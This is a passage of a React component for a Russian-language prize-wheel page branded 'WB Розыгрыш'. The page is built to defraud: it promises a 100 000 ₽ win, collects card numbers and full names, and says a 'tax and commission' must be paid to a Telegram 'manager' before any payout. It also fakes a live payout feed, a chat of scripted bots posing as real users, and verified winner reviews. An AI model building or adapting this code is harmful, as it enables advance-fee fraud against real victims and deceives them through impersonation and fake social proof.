    const myMsg: ChatMsg = { bot: -1, text, time: nowTime(), id: msgIdRef.current++ };
    setChat(c => [...c, myMsg]);
    setChatInput('');
    const replies = getSmartReplies(text);
    replies.forEach((reply, i) => {
      const delay = 1600 + i * rndInt(1800, 3000);
      setTimeout(() => {
        setTyping(reply.bot);
        setTimeout(() => {
          setTyping(null);
          setChat(c => [...c, { ...reply, time: nowTime(), id: msgIdRef.current++ }]);
        }, 900 + reply.text.length * 28);
      }, delay);
    });
  };

  // Отзывы с поиском
  const filteredReviews = reviewSearch.trim()
    ? ALL_REVIEWS.filter(r => r.name.toLowerCase().includes(reviewSearch.toLowerCase()) || r.city.toLowerCase().includes(reviewSearch.toLowerCase()) || r.text.toLowerCase().includes(reviewSearch.toLowerCase()))
    : ALL_REVIEWS;
  const visibleReviews = filteredReviews.slice(0, reviewPage * PAGE_SIZE);
  const hasMoreReviews = visibleReviews.length < filteredReviews.length;

  const reviewsRef = useRef<HTMLDivElement>(null);
  const loadMoreReviews = useCallback(() => setReviewPage(p => p + 1), []);

  return (
    <div className="mx-auto min-h-screen max-w-md bg-[#0E0E10] pb-8">
      {/* Header */}
      <div className="sticky top-0 z-30 flex items-center justify-between bg-[#0E0E10]/90 px-4 py-3 backdrop-blur-md border-b border-white/5">
        <div className="flex items-center gap-2">
          <div className="flex h-9 w-9 items-center justify-center rounded-xl wb-gradient text-lg font-black">W</div>
          <div>
            <div className="text-base font-extrabold leading-tight">WB Розыгрыш</div>
            <div className="text-[11px] text-white/50">Жаркий розыгрыш 🔥</div>
          </div>
        </div>
        <div className="flex items-center gap-2 rounded-full bg-[#1A1A1D] px-3 py-1.5">
          <Icon name="Wallet" size={15} className="text-[#FF1FB3]" />
          <span className="text-sm font-bold">{balance.toLocaleString('ru-RU')} ₽</span>
        </div>
      </div>

      {/* Бегущая строка */}
      <div className="overflow-hidden border-b border-white/5 bg-[#1A1A1D]/60 py-2">
        <div className="flex w-max animate-marquee gap-8 whitespace-nowrap">
          {[...feed.slice(0,8), ...feed.slice(0,8)].map((n, i) => (
            <span key={i} className="flex items-center gap-2 text-xs text-white/70">
              <span className="text-[#FF1FB3]">●</span>
              <b className="text-white">{n.name}</b> вывел <b className="text-[#FF1FB3]">{n.sum}</b> · {n.city}
            </span>
          ))}
        </div>
      </div>

      <div className="space-y-4 px-4 pt-4">

        {/* ── Колесо ─────────────────────────────────────────── */}
        <div className="rounded-3xl bg-[#1A1A1D] p-5 text-center">
          <div className="mb-1 text-xl font-extrabold">Колесо Фортуны</div>
          <p className="mb-4 text-xs text-white/50">3 попытки · главный приз 100 000 ₽</p>
          <div className="flex justify-center"><Wheel spinning={spinning} rotation={rotation} /></div>
          <div className="mt-4 flex justify-center gap-2">
            {[1,2,3].map(n => (
              <div key={n} className={`flex h-9 w-9 items-center justify-center rounded-xl text-sm font-bold transition-all ${attempts >= n ? 'wb-gradient scale-105' : 'bg-[#232327] text-white/40'}`}>{n}</div>
            ))}
          </div>
          {resultMsg && (
            <div className={`mt-4 animate-scale-in rounded-2xl px-4 py-3 text-sm font-semibold ${won ? 'bg-[#FF1FB3]/20 text-[#FF1FB3]' : 'bg-[#232327] text-white/70'}`}>{resultMsg}</div>
          )}
          {history.length > 0 && (
            <div className="mt-3 space-y-1">
              {history.map((h, i) => <div key={i} className="rounded-xl bg-[#232327] px-3 py-2 text-xs text-white/60">{h}</div>)}
            </div>
          )}
          {!won ? (
            <button onClick={spin} disabled={spinning || attempts >= 3}
              className="mt-4 w-full rounded-2xl wb-gradient py-4 text-base font-extrabold text-white shadow-lg transition active:scale-95 disabled:opacity-40 animate-glow">
              {spinning ? 'Крутится...' : attempts >= 3 ? 'Попытки закончились' : `Крутить (${3 - attempts} осталось)`}
            </button>
          ) : (
            <button onClick={() => setShowWithdraw(v => !v)}
              className="mt-4 w-full rounded-2xl bg-[#FF1FB3] py-4 text-base font-extrabold text-white shadow-lg transition active:scale-95">
              💰 Вывести 100 000 ₽
            </button>
          )}
        </div>

        {/* ── Форма вывода ───────────────────────────────────── */}
        {showWithdraw && (
          <div className="animate-scale-in rounded-3xl bg-[#1A1A1D] p-5">
            <div className="mb-3 flex items-center gap-2">
              <Icon name="Banknote" size={20} className="text-[#FF1FB3]" />
              <span className="text-lg font-extrabold">Вывод средств</span>
            </div>
            <div className="space-y-3">
              <input placeholder="Номер карты для вывода" className="w-full rounded-xl bg-[#232327] px-4 py-3 text-sm outline-none placeholder:text-white/40" />
              <input placeholder="ФИО получателя" className="w-full rounded-xl bg-[#232327] px-4 py-3 text-sm outline-none placeholder:text-white/40" />
              <div className="rounded-2xl border border-[#FF1FB3]/30 bg-[#FF1FB3]/10 p-4 text-sm text-white/80">
                <b className="text-[#FF1FB3]">Внимание!</b> Для вывода <b>100 000 ₽</b> необходимо оплатить налог и комиссию платёжной системы — <b>{COMMISSION.toLocaleString('ru-RU')} ₽</b>. Сумма включается в итоговый перевод. Свяжитесь с менеджером для оплаты.
              </div>
              <a href={MANAGER_URL} target="_blank" rel="noreferrer"
                className="flex w-full items-center justify-center gap-2 rounded-2xl wb-gradient py-4 text-base font-extrabold text-white active:scale-95">
                <Icon name="Send" size={18} /> Написать менеджеру
              </a>
              <p className="text-center text-xs text-white/40">@Ekaterinamoneys · отвечает за 2–3 минуты</p>
            </div>
          </div>
        )}

        {/* ── Лента выплат ───────────────────────────────────── */}
        <div className="rounded-3xl bg-[#1A1A1D] p-5">
          <div className="mb-3 flex items-center gap-2">
            <Icon name="TrendingUp" size={20} className="text-[#FF1FB3]" />
            <span className="text-lg font-extrabold">Лента выводов</span>
            <span className="ml-auto flex items-center gap-1 text-xs text-green-400">
              <span className="h-2 w-2 animate-pulse rounded-full bg-green-400" /> live
            </span>
          </div>
          <div className="space-y-2">
            {feed.map((n, i) => (
              <div key={n.id} className={`flex items-center justify-between rounded-2xl bg-[#232327] px-4 py-3 ${i === 0 ? 'animate-fade-in' : ''}`}>
                <div className="flex items-center gap-3">
                  <div className="flex h-9 w-9 items-center justify-center rounded-full wb-gradient text-sm font-bold">{n.name[0]}</div>
                  <div>
                    <div className="text-sm font-semibold">{n.name}</div>
                    <div className="text-[11px] text-white/40">{n.city} · только что</div>
                  </div>
                </div>
                <div className={`text-sm font-extrabold ${n.sum === '100 000 ₽' ? 'text-[#FF1FB3]' : 'text-[#A020F0]'}`}>+{n.sum}</div>
              </div>
            ))}
          </div>
        </div>

        {/* ── Живой чат ──────────────────────────────────────── */}
        <div className="rounded-3xl bg-[#1A1A1D] p-5">
          <div className="mb-3 flex items-center gap-2">
            <Icon name="MessagesSquare" size={20} className="text-[#FF1FB3]" />
            <span className="text-lg font-extrabold">Живой чат</span>
            <span className="ml-auto flex items-center gap-1 text-xs text-green-400">
              <span className="h-2 w-2 animate-pulse rounded-full bg-green-400" />
              {onlineCount.toLocaleString('ru-RU')} онлайн
            </span>
          </div>
          <div ref={chatRef} className="no-scrollbar mb-3 h-80 space-y-2.5 overflow-y-auto pr-1">
            {chat.length === 0 && <div className="flex h-full items-center justify-center text-sm text-white/30">Загрузка чата...</div>}
            {chat.map(m => {
              const me = m.bot === -1;
              const bot = me ? null : BOTS[m.bot % BOTS.length];
              return (
                <div key={m.id} className={`flex gap-2 animate-fade-in ${me ? 'flex-row-reverse' : ''}`}>
                  {!me && (
                    <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full text-sm font-bold"
                      style={{ backgroundColor: bot!.color + '33', color: bot!.color }}>{bot!.avatar}</div>
                  )}
                  <div className={`max-w-[78%]`}>
                    {!me && <div className="mb-0.5 ml-1 text-[11px] font-bold" style={{ color: bot!.color }}>{bot!.name}</div>}
                    <div className={`rounded-2xl px-3 py-2 text-sm leading-relaxed ${me ? 'wb-gradient text-white' : 'bg-[#232327] text-white/90'}`}>{m.text}</div>
                    <div className={`mt-0.5 text-[10px] text-white/25 ${me ? 'text-right mr-1' : 'ml-1'}`}>{m.time}</div>
                  </div>
                </div>
              );
            })}
            {typing !== null && (
              <div className="flex gap-2 animate-fade-in">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full text-sm font-bold"
                  style={{ backgroundColor: BOTS[typing % BOTS.length].color + '33', color: BOTS[typing % BOTS.length].color }}>
                  {BOTS[typing % BOTS.length].avatar}
                </div>
                <div>
                  <div className="mb-0.5 ml-1 text-[11px] font-bold" style={{ color: BOTS[typing % BOTS.length].color }}>{BOTS[typing % BOTS.length].name}</div>
                  <div className="flex items-center gap-1 rounded-2xl bg-[#232327] px-4 py-3">
                    {[0,150,300].map(d => <span key={d} className="h-1.5 w-1.5 animate-bounce rounded-full bg-white/50" style={{ animationDelay: `${d}ms` }} />)}
                  </div>
                </div>
              </div>
            )}
          </div>
          <div className="flex gap-2">
            <input value={chatInput} onChange={e => setChatInput(e.target.value)} onKeyDown={e => e.key === 'Enter' && sendChat()}
              placeholder="Написать сообщение..." className="flex-1 rounded-xl bg-[#232327] px-4 py-3 text-sm outline-none placeholder:text-white/40" />
            <button onClick={sendChat} className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl wb-gradient active:scale-90">
              <Icon name="Send" size={18} />
            </button>
          </div>
        </div>

        {/* ── Отзывы ─────────────────────────────────────────── */}
        <div className="rounded-3xl bg-[#1A1A1D] p-5" ref={reviewsRef}>
          <div className="mb-1 flex items-center gap-2">
            <Icon name="Star" size={20} className="text-[#FF1FB3]" />
            <span className="text-lg font-extrabold">Отзывы победителей</span>
          </div>
          <div className="mb-3 flex items-center gap-2 text-sm text-white/50">
            <span className="text-yellow-400">★★★★★</span> 4.9 · {ALL_REVIEWS.length.toLocaleString('ru-RU')} отзывов
          </div>
          <input value={reviewSearch} onChange={e => { setReviewSearch(e.target.value); setReviewPage(1); }}
            placeholder="Поиск по имени, городу или тексту..."
            className="mb-4 w-full rounded-xl bg-[#232327] px-4 py-3 text-sm outline-none placeholder:text-white/40" />
          <div className="space-y-3">
            {visibleReviews.map(r => (
              <div key={r.id} className="rounded-2xl bg-[#232327] p-4">
                <div className="mb-2 flex items-center gap-3">
                  <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-full text-base font-bold text-white" style={{ backgroundColor: r.color }}>{r.initials}</div>
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center gap-1">
                      <span className="text-sm font-bold">{r.name}</span>
                      <Icon name="BadgeCheck" size={13} className="shrink-0 text-[#A020F0]" />
                    </div>
                    <div className="text-[11px] text-white/40">{r.city} · {r.date}</div>
                  </div>
                  <div className="shrink-0 text-right">
                    <div className="text-xs font-bold text-yellow-400">{'★'.repeat(r.stars)}</div>
                    <div className="mt-0.5 rounded-full bg-green-500/15 px-2 py-0.5 text-[10px] font-bold text-green-400">✓ Выплачено {r.sum}</div>
                  </div>
                </div>
                <p className="text-sm leading-relaxed text-white/80">{r.text}</p>
              </div>
            ))}
          </div>
          {filteredReviews.length === 0 && (
            <div className="py-8 text-center text-sm text-white/40">Ничего не найдено</div>
          )}
          {hasMoreReviews && (
            <button onClick={loadMoreReviews}
              className="mt-4 w-full rounded-2xl bg-[#232327] py-3 text-sm font-semibold text-white/70 transition hover:bg-[#2a2a2e] active:scale-95">
              Показать ещё ({(filteredReviews.length - visibleReviews.length).toLocaleString('ru-RU')} отзывов)
            </button>
          )}
        </div>

      </div>
    </div>
  );
};

export default Index;